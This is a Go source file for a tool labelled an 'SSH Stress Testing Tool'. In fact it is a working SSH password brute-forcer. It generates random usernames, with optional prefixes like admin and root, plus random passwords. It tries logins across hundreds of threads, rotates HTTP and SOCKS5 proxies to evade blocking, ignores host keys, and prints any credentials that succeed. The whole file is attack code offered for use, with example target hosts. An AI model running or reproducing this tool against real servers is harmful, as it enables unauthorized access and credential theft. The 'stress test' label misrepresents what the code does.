package main

import (
	"bufio"
	"context"
	"fmt"
	"log"
	"math/rand"
	"net"
	"net/http"
	"net/url"
	"os"
	"strconv"
	"strings"
	"sync"
	"sync/atomic"
	"time"

	"golang.org/x/crypto/ssh"
	"golang.org/x/net/proxy"
)

type SSHStresser struct {
	host     string
	port     int
	username string
	password string
	timeout  time.Duration
	proxyURL string
}

type SSHOptions struct {
	Host     string
	Port     int
	Username string
	Password string
	Timeout  time.Duration
	ProxyURL string
}

type StressConfig struct {
	MinUsernameLength int
	MaxUsernameLength int
	MinPasswordLength int
	MaxPasswordLength int
	UseNumbers        bool
	UseSpecialChars   bool
	UsernamePrefixes  []string
}

var (
	letters      = "abcdefghijklmnopqrstuvwxyz"
	numbers      = "0123456789"
	specialChars = "!@#$%^&*()_+-=[]{}|;:,.<>?"
)

func NewSSHStresser(options SSHOptions) *SSHStresser {
	if options.Port == 0 {
		options.Port = 22
	}
	if options.Timeout == 0 {
		options.Timeout = 30 * time.Second
	}

	return &SSHStresser{
		host:     options.Host,
		port:     options.Port,
		username: options.Username,
		password: options.Password,
		timeout:  options.Timeout,
		proxyURL: options.ProxyURL,
	}
}

func generateRandomString(length int, useNumbers bool, useSpecial bool) string {
	charset := letters
	if useNumbers {
		charset += numbers
	}
	if useSpecial {
		charset += specialChars
	}

	result := make([]byte, length)
	for i := range result {
		result[i] = charset[rand.Intn(len(charset))]
	}
	return string(result)
}

func createCredentialGenerator(config StressConfig) func() (string, string) {
	return func() (string, string) {
		usernameLength := rand.Intn(config.MaxUsernameLength-config.MinUsernameLength+1) + config.MinUsernameLength

		var username string
		if len(config.UsernamePrefixes) > 0 {
			prefix := config.UsernamePrefixes[rand.Intn(len(config.UsernamePrefixes))]
			remainingLength := usernameLength - len(prefix)
			if remainingLength > 0 {
				suffix := generateRandomString(remainingLength, config.UseNumbers, false)
				username = prefix + suffix
			} else {
				username = prefix[:usernameLength]
			}
		} else {
			username = generateRandomString(usernameLength, config.UseNumbers, false)
		}

		passwordLength := rand.Intn(config.MaxPasswordLength-config.MinPasswordLength+1) + config.MinPasswordLength
		password := generateRandomString(passwordLength, config.UseNumbers, config.UseSpecialChars)

		return username, password
	}
}

func (s *SSHStresser) createDialer() (func(network, addr string) (net.Conn, error), error) {
	if s.proxyURL == "" {
		dialer := &net.Dialer{
			Timeout:   s.timeout,
			KeepAlive: 30 * time.Second,
		}
		return dialer.Dial, nil
	}

	proxyURL, err := url.Parse(s.proxyURL)
	if err != nil {
		return nil, fmt.Errorf("invalid proxy URL: %v", err)
	}

	switch proxyURL.Scheme {
	case "http", "https":
		return func(network, addr string) (net.Conn, error) {
			conn, err := net.DialTimeout("tcp", proxyURL.Host, s.timeout)
			if err != nil {
				return nil, err
			}

			connectReq := fmt.Sprintf("CONNECT %s HTTP/1.1\r\nHost: %s\r\n\r\n", addr, addr)
			if _, err := conn.Write([]byte(connectReq)); err != nil {
				conn.Close()
				return nil, err
			}

			reader := bufio.NewReader(conn)
			response, err := http.ReadResponse(reader, nil)
			if err != nil {
				conn.Close()
				return nil, err
			}
			defer response.Body.Close()

			if response.StatusCode != 200 {
				conn.Close()
				return nil, fmt.Errorf("proxy connection failed: %s", response.Status)
			}

			return conn, nil
		}, nil

	case "socks5", "socks5h":
		dialer, err := proxy.FromURL(proxyURL, proxy.Direct)
		if err != nil {
			return nil, fmt.Errorf("SOCKS5 proxy error: %v", err)
		}

		if socksDialer, ok := dialer.(proxy.ContextDialer); ok {
			return func(network, addr string) (net.Conn, error) {
				ctx, cancel := context.WithTimeout(context.Background(), s.timeout)
				defer cancel()
				return socksDialer.DialContext(ctx, network, addr)
			}, nil
		}

		return dialer.Dial, nil

	default:
		return nil, fmt.Errorf("unsupported proxy scheme: %s", proxyURL.Scheme)
	}
}

func (s *SSHStresser) Stress() error {
	config := &ssh.ClientConfig{
		User: s.username,
		Auth: []ssh.AuthMethod{
			ssh.Password(s.password),
		},
		HostKeyCallback: ssh.InsecureIgnoreHostKey(),
		Timeout:         s.timeout,
	}

	customDialer, err := s.createDialer()
	if err != nil {
		return fmt.Errorf("failed to create dialer: %v", err)
	}

	address := net.JoinHostPort(s.host, strconv.Itoa(s.port))

	conn, err := customDialer("tcp", address)
	if err != nil {
		return fmt.Errorf("connection failed: %v", err)
	}
	defer conn.Close()

	sshConn, chans, reqs, err := ssh.NewClientConn(conn, address, config)
	if err != nil {
		return fmt.Errorf("SSH handshake failed: %v", err)
	}

	client := ssh.NewClient(sshConn, chans, reqs)
	defer client.Close()

	session, err := client.NewSession()
	if err != nil {
		return fmt.Errorf("SSH session creation failed: %v", err)
	}
	defer session.Close()

	return nil
}

func readProxiesFromFile(filename string) ([]string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	var proxies []string
	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		proxy := strings.TrimSpace(scanner.Text())
		if proxy != "" {
			proxies = append(proxies, proxy)
		}
	}
	return proxies, scanner.Err()
}

func StressSSH(host string, port int, timeout time.Duration, threads int, proxies []string, stressConfig StressConfig, duration time.Duration) {
	var wg sync.WaitGroup
	semaphore := make(chan struct{}, threads)

	results := make(chan string, 1000)
	var totalConnections int32
	var successfulConnections int32
	var failedConnections int32

	rand.Seed(time.Now().UnixNano())
	credGenerator := createCredentialGenerator(stressConfig)

	startTime := time.Now()
	endTime := startTime.Add(duration)

	fmt.Printf("Starting SSH stress test on %s:%d for %v\n", host, port, duration)
	fmt.Printf("Threads: %d, Timeout: %v, Proxies: %d\n", threads, timeout, len(proxies))

	go func() {
		ticker := time.NewTicker(5 * time.Second)
		defer ticker.Stop()
		
		for {
			select {
			case <-ticker.C:
				success := atomic.LoadInt32(&successfulConnections)
				failed := atomic.LoadInt32(&failedConnections)
				total := atomic.LoadInt32(&totalConnections)
				elapsed := time.Since(startTime)
				
				fmt.Printf("[STATS] Time: %v, Total: %d, Success: %d, Failed: %d, Rate: %.2f/s\n",
					elapsed.Round(time.Second), total, success, failed, float64(total)/elapsed.Seconds())
			case result := <-results:
				fmt.Println(result)
			}
		}
	}()

	for i := 0; i < threads; i++ {
		wg.Add(1)
		semaphore <- struct{}{}

		go func(workerID int) {
			defer wg.Done()
			defer func() { <-semaphore }()

			var workerProxy string
			if len(proxies) > 0 {
				workerProxy = proxies[workerID%len(proxies)]
			}

			for time.Now().Before(endTime) {
				username, password := credGenerator()

				stresser := NewSSHStresser(SSHOptions{
					Host:     host,
					Port:     port,
					Username: username,
					Password: password,
					Timeout:  timeout,
					ProxyURL: workerProxy,
				})

				atomic.AddInt32(&totalConnections, 1)
				
				if err := stresser.Stress(); err == nil {
					atomic.AddInt32(&successfulConnections, 1)
					results <- fmt.Sprintf("[SUCCESS] Worker %d - Connection established with %s:%s", workerID, username, password)
				} else {
					atomic.AddInt32(&failedConnections, 1)
					if strings.Contains(err.Error(), "unable to authenticate") {
						results <- fmt.Sprintf("[AUTH_FAIL] Worker %d - %s:%s", workerID, username, password)
					}
				}

				time.Sleep(time.Duration(rand.Intn(200)+50) * time.Millisecond)
			}
		}(i)
	}

	wg.Wait()
	close(results)
	
	elapsed := time.Since(startTime)
	success := atomic.LoadInt32(&successfulConnections)
	failed := atomic.LoadInt32(&failedConnections)
	total := atomic.LoadInt32(&totalConnections)
	
	fmt.Printf("\n=== STRESS TEST COMPLETED ===\n")
	fmt.Printf("Duration: %v\n", elapsed.Round(time.Second))
	fmt.Printf("Total connections: %d\n", total)
	fmt.Printf("Successful: %d\n", success)
	fmt.Printf("Failed: %d\n", failed)
	fmt.Printf("Success rate: %.2f%%\n", float64(success)/float64(total)*100)
	fmt.Printf("Average rate: %.2f connections/second\n", float64(total)/elapsed.Seconds())
}

func showHelp() {
	fmt.Println("SSH Stress Testing Tool")
	fmt.Println("Usage: ssh-stress <host> [options]")
	fmt.Println()
	fmt.Println("Options:")
	fmt.Println("  -p, --port PORT          SSH port (default: 22)")
	fmt.Println("  -t, --threads THREADS    Number of threads (default: 50)")
	fmt.Println("  -T, --timeout TIMEOUT    Connection timeout (default: 30s)")
	fmt.Println("  -d, --duration DURATION  Test duration (default: 5m)")
	fmt.Println("  -x, --proxy FILE         File with proxy list")
	fmt.Println("  --min-user LEN           Min username length (default: 3)")
	fmt.Println("  --max-user LEN           Max username length (default: 8)")
	fmt.Println("  --min-pass LEN           Min password length (default: 4)")
	fmt.Println("  --max-pass LEN           Max password length (default: 12)")
	fmt.Println("  --no-numbers             Don't use numbers in passwords")
	fmt.Println("  --special-chars          Use special characters in passwords")
	fmt.Println("  --prefixes P1,P2,P3      Username prefixes (comma separated)")
	fmt.Println("  -h, --help               Show this help message")
	fmt.Println()
	fmt.Println("Examples:")
	fmt.Println("  ssh-stress 192.168.1.1 -t 100 -d 10m")
	fmt.Println("  ssh-stress example.com -p 2222 -x proxies.txt -t 200 -d 30m")
	fmt.Println("  ssh-stress target.com --prefixes admin,root -t 150 -d 1h")
	fmt.Println("  ssh-stress 10.0.0.1 -t 300 -T 10s -d 5m")
	fmt.Println()
	fmt.Println("Proxy file format (one proxy per line):")
	fmt.Println("  http://proxy1:8080")
	fmt.Println("  socks5://proxy2:1080")
	fmt.Println("  http://user:pass@proxy3:3128")
}

func main() {
	if len(os.Args) < 2 {
		showHelp()
		return
	}

	if os.Args[1] == "-h" || os.Args[1] == "--help" {
		showHelp()
		return
	}

	host := os.Args[1]
	port := 22
	threads := 50
	timeout := 30 * time.Second
	duration := 5 * time.Minute
	var proxyFile string

	stressConfig := StressConfig{
		MinUsernameLength: 3,
		MaxUsernameLength: 8,
		MinPasswordLength: 4,
		MaxPasswordLength: 12,
		UseNumbers:        true,
		UseSpecialChars:   false,
		UsernamePrefixes:  []string{},
	}

	for i := 2; i < len(os.Args); i++ {
		arg := os.Args[i]
		switch arg {
		case "-p", "--port":
			if i+1 < len(os.Args) {
				if p, err := strconv.Atoi(os.Args[i+1]); err == nil {
					port = p
				}
				i++
			}
		case "-t", "--threads":
			if i+1 < len(os.Args) {
				if t, err := strconv.Atoi(os.Args[i+1]); err == nil {
					threads = t
				}
				i++
			}
		case "-T", "--timeout":
			if i+1 < len(os.Args) {
				if t, err := time.ParseDuration(os.Args[i+1]); err == nil {
					timeout = t
				}
				i++
			}
		case "-d", "--duration":
			if i+1 < len(os.Args) {
				if d, err := time.ParseDuration(os.Args[i+1]); err == nil {
					duration = d
				}
				i++
			}
		case "-x", "--proxy":
			if i+1 < len(os.Args) {
				proxyFile = os.Args[i+1]
				i++
			}
		case "--min-user":
			if i+1 < len(os.Args) {
				if l, err := strconv.Atoi(os.Args[i+1]); err == nil {
					stressConfig.MinUsernameLength = l
				}
				i++
			}
		case "--max-user":
			if i+1 < len(os.Args) {
				if l, err := strconv.Atoi(os.Args[i+1]); err == nil {
					stressConfig.MaxUsernameLength = l
				}
				i++
			}
		case "--min-pass":
			if i+1 < len(os.Args) {
				if l, err := strconv.Atoi(os.Args[i+1]); err == nil {
					stressConfig.MinPasswordLength = l
				}
				i++
			}
		case "--max-pass":
			if i+1 < len(os.Args) {
				if l, err := strconv.Atoi(os.Args[i+1]); err == nil {
					stressConfig.MaxPasswordLength = l
				}
				i++
			}
		case "--no-numbers":
			stressConfig.UseNumbers = false
		case "--special-chars":
			stressConfig.UseSpecialChars = true
		case "--prefixes":
			if i+1 < len(os.Args) {
				prefixes := strings.Split(os.Args[i+1], ",")
				for i, p := range prefixes {
					prefixes[i] = strings.TrimSpace(p)
				}
				stressConfig.UsernamePrefixes = prefixes
				i++
			}
		case "-h", "--help":
			showHelp()
			return
		}
	}

	var proxies []string
	if proxyFile != "" {
		var err error
		proxies, err = readProxiesFromFile(proxyFile)
		if err != nil {
			log.Printf("Warning: Could not read proxy file: %v", err)
		} else {
			fmt.Printf("Loaded %d proxies from %s\n", len(proxies), proxyFile)
		}
	}

	StressSSH(host, port, timeout, threads, proxies, stressConfig, duration)
}
